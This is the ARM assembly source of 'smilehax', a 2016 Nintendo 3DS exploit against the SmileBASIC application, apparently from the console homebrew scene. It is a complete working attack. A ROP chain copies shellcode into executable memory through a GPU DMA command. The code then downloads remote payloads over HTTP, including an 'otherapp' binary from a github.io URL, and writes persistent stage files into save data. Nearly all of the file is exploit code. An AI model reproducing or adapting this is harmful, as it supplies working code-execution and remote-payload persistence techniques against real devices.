/* smilehax - smilebasic exploit */
/* plutoo 2016 */

#include "macros.h"
#include "constants.h"

#define MAKE_ADDR(addr) (addr - start + STAGE1_BASE)
#define CODE_SIZE (code_end - code_start)

start:
    .word GADGET_R0               // pop {r0, pc}
        .word CODE_BUF                // r0
    .word GADGET_R1R2R3R4R5       // pop {r1-r5, pc}
        .word MAKE_ADDR(code_start)   // r1
        .word CODE_SIZE               // r2
        .word GARBAGE                 // r3
        .word GARBAGE                 // r4
        .word GARBAGE                 // r5
    .word MEMCPY+4                // memcpy(...), copy code to linear mem
        .word GARBAGE                 // r4
        .word GARBAGE                 // r5
        .word GARBAGE                 // r6
        .word GARBAGE                 // r7
        .word GARBAGE                 // r8
        .word GARBAGE                 // r9
        .word GARBAGE                 // r10
    .word GADGET_R0               // pop {r0, pc}
        .word CODE_BUF                // r0
    .word GADGET_R1               // pop {r1, pc}
        .word CODE_SIZE               // r1
    .word GSP_FLUSH_DATA_CACHE+4  // gsp::FlushDataCache(...)
        .word GARBAGE                 // r4
        .word GARBAGE                 // r5
        .word GARBAGE                 // r6
    .word GSP_ENQUEUE_CMD_GADGET  // gsp::EnqueueGpuCommand(...)
        .word 4                       // sp_arg0  cmd_type=TEXTURE_COPY
        .word CODE_BUF                // sp_arg1  src_ptr
        .word PA_TO_GPU_ADDR(CODE_DST_PA) // sp_arg2  dst_ptr
        .word CODE_SIZE               // sp_arg3  size=code_size
        .word 0                       // sp_arg4  in_dimensions=0
        .word 0                       // sp_arg5  out_dimensions=0
        .word 8                       // sp_arg6  flags=RAW_MEM_COPY
        .word 0                       // sp_arg7  not used
        .word GARBAGE                 // ...
        .word GARBAGE                 // r4
        .word GARBAGE                 // r5
        .word GARBAGE                 // r6
        .word GARBAGE                 // r7
    .word GADGET_POP_R4R5LR__BX_LR // initialize lr to pop {r0, pc}
        .word GARBAGE                 // r4
        .word GARBAGE                 // r5
    .word GADGET_R0               // pop {r0, pc}
        .word GARBAGE                 // r0
    .word GADGET_R0               // pop {r0, pc}
        .word 1000000000              // r0  ticks_lo
    .word GADGET_R1               // pop {r1, pc}
        .word 0                       // r1  ticks_hi
    .word SVC_SLEEP_THREAD        // svc::SleepThread(...)
        .word GARBAGE                 // r0, from lr-pop
    .word CODE_DST_VA             // jump to code

.org 0x100, 0x44
code_start:
    sub sp, #0x100

    /* Blue screen. */
    bl framebuffer_reset
    ldr r0, =0x0000FFFF
    bl framebuffer_fill

    /* Scan looking for OA$= string in original payload. */
    ldr r0, =0x00F00000
    ldr r2, =(0x01D00000-0x00F00000)
    ldr r3, =0x0041004F
__scan_loop:
    ldr r1, [r0]
    cmp r1, r3
    beq __found
    add r0, #4
    sub r2, #1
    cmp r2, #0
    bne __scan_loop
    /* Orange screen on failure to find it. */
    ldr r1, =0xFF8000FF
    b   panic

__found:
    /* Convert it from UCS-2 to ASCII. */
    add r0, #2*5
    add r1, sp, #0x80
__conv_loop:
    ldrh r2, [r0]
    strb r2, [r1]
    add r0, #2
    add r1, #1
    cmp r2, #0x22 /* Quote-character. */
    bne __conv_loop
    sub r1, #1
    mov r0, #0
    strb r0, [r1]

    /* Construct URL. */
    add r0, sp, #0
    mov r1, #0x80
    adr r2, __otherapp_format
    add r3, sp, #0x80
    ldr r5, =SNPRINTF
    blx r5

    /* Download otherapp. */
    add r0, sp, #0
    adr r1, __otherapp_path
    mov r2, #0xC000
    mov r3, #1
    bl download_file

    /* Download persistent stage0. */
    adr r0, __stage0_url
    adr r1, __stage0_path
    mov r2, #0x800
    mov r3, #0
    bl download_file

    /* Download persistent stage1. */
    adr r0, __stage1_url
    adr r1, __stage1_path
    mov r2, #0x800
    mov r3, #1
    bl download_file

    /* Green screen. */
    ldr r0, =0x00FF00FF
    bl framebuffer_fill

    ldr r5, =0x44444444
    blx r5

__otherapp_format:
    .asciz "http://smealum.github.io/ninjhax2/JL1Xf2KFVm/otherapp/%s.bin"
.align 2

__otherapp_path:
    .string16 "save:/###/BOTHERAPP\0"

__stage0_url:
    .ascii HTTP_BASE
    .ascii "/"
    .ascii HAX_COMBO
    .asciz "/THAX"
.align 2

__stage0_path:
    .string16 "save:/###/THAX\0"

__stage1_url:
    .ascii HTTP_BASE
    .ascii "/"
    .ascii HAX_COMBO
    .asciz "/BPAYLOAD"
.align 2

__stage1_path:
    .string16 "save:/###/BPAYLOAD\0"

.align 4

/* download_file: r0=www, r1=dst_path, r2=max_size, r3=should_pad_file */
download_file:
    push {lr}
    sub sp, #0x100

    mov r7, r0
    mov r8, r1
    mov r9, r2
    mov r10, r3

    /* Setup HTTPC object. */
    add r0, sp, #0x80
    mov r1, #0
    mov r2, #0x80
    bl memset32

    add r0, sp, #0x80 // struct_ptr
    mov r1, r7 // www
    mov r2, #1 // http_method=GET
    mov r3, #1 // use_proxy=true
    ldr r5, =HTTPC_INITSTRUCT
    blx r5

    /* Force crash on failure: yellow screen. */
    cmp r0, #0
    beq __initstruct_ok
    ldr r1, =0xFFFF00FF
    b   panic
__initstruct_ok:

    /* Make HTTP request. */
    add r0, sp, #0x80
    ldr r5, =HTTPC_BEGINREQUEST
    blx r5

    /* Force crash on failure: teal screen. */
    cmp r0, #0
    beq __beginreq_ok
    ldr r1, =0x00FFFFFF
    b   panic
__beginreq_ok:

    add r0, sp, #0x80 // struct_ptr
    ldr r1, =CODE_BUF // out_ptr
    mov r2, r9 // out_size
    ldr r5, =HTTPC_RECVDATA
    blx r5

    /* Force crash on failure: light purple screen. */
    cmp r0, #0
    beq __recvdata_ok
    ldr r1, =0xFA58F4FF
    b   panic
__recvdata_ok:

    /* Get file size from HTTP server if r10==0. */
    add r0, sp, #0x80 // struct_ptr
    add r1, sp, #4 // cur_pos_out
    add r2, sp, #8 // total_size_out
    ldr r5, =HTTPC_GETSIZE
    blx r5

    cmp r10, #0
    ldreq r9, [sp, #8]

    /* Force crash on failure: brown screen. */
    cmp r0, #0
    beq __getsize_ok
    ldr r1, =0x3B240BFF
    b   panic
__getsize_ok:

    /* Delete file and create it with correct size, required for extdata. */
    mov r0, r8
    ldr r5, =FS_DELETE_FILE
    blx r5
    mov r0, r8
    mov r2, r9
    mov r3, #0
    ldr r5, =FS_CREATE_FILE
    blx r5

    /* Force crash on failure: dark blue screen. */
    cmp r0, #0
    beq __createfile_ok
    ldr r1, =0x0B2F3AFF
    b   panic
__createfile_ok:

    add r0, sp, #0x40
    mov r1, r8
    mov r2, #3 // readwrite
    ldr r5, =FS_OPEN_FILE
    blx r5

    /* Force crash on failure: dark purple screen. */
    cmp r0, #0
    beq __openfile_ok
    ldr r1, =0x2F0B3AFF
    bl framebuffer_fill
__openfile_ok:

    add r0, sp, #12 // bytes_out
    ldr r1, [sp, #0x40] // handle
    mov r2, #0 // offset_lo
    mov r3, #0 // offset_hi
    ldr r4, =CODE_BUF
    str r4, [sp] // buf
    str r9, [sp, #4] // len
    mov r4, #1
    str r4, [sp, #8] // flush_flag=1
    ldr r5, =FS_WRITE_FILE
    blx r5

    ldr r0, [sp, #12]
    cmp r0, r9
    beq __writefile_len_ok
    /* Gray screen. */
    ldr r1, =0x6E6E6EFF
    b   panic
__writefile_len_ok:

    /* Force crash on failure: black screen. */
    cmp r0, r9
    beq __writefile_ok
    ldr r1, =0x000000FF
    b   panic
__writefile_ok:

    add sp, #0x100
    pop {pc}
.pool

panic:
    mov r9, r0
    mov r10, lr
    mov r0, r1
    bl framebuffer_fill
    ldr r0, =0xFBADC0DE
    blx r0

memset32:
    cmp r2, #0
    bxeq lr
    str r1, [r0], #4
    sub r2, #4
    b memset32

/* framebuffer_reset: Setup framebuffer to point to FRAMEBUF_ADDR. */
framebuffer_reset:
    push {lr}
    ldr  r0, =0x00400468
    bl   set_fb_register
    ldr  r0, =0x0040046C
    bl   set_fb_register
    ldr  r0, =0x00400494
    bl   set_fb_register
    ldr  r0, =0x00400498
    bl   set_fb_register

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x00400470
    adr  r1, __fb_format
    mov  r2, #4
    blx  r3

    ldr  r3, =GSP_WRITE_HW_REGS
    ldr  r0, =0x0040045C
    adr  r1, __fb_size
    mov  r2, #4
    blx  r3

    pop  {pc}
__fb_format:
    .word (0 | (1<<6))
__fb_size:
    .word (240<<16) | (400)

set_fb_register:
    ldr  r3, =GSP_WRITE_HW_REGS
    adr  r1, __fb_physaddr
    mov  r2, #4
    bx   r3
__fb_physaddr:
    .word GPU_TO_PA_ADDR(FRAMEBUF_ADDR)

/* framebuffer_fill: Fill framebuffer with color in r0. */
framebuffer_fill:
    ldr   r1, =FRAMEBUF_ADDR
    ldr   r2, =FRAMEBUF_SIZE
    add   r2, r1
__fill_loop:
    str   r0, [r1]
    add   r1, #4
    cmp   r1, r2
    bne   __fill_loop
    ldr   r4, =GSP_FLUSH_DATA_CACHE
    ldr   r0, =FRAMEBUF_ADDR
    ldr   r1, =FRAMEBUF_SIZE
    bx    r4

.pool

.org 0x800, 0x44
code_end:
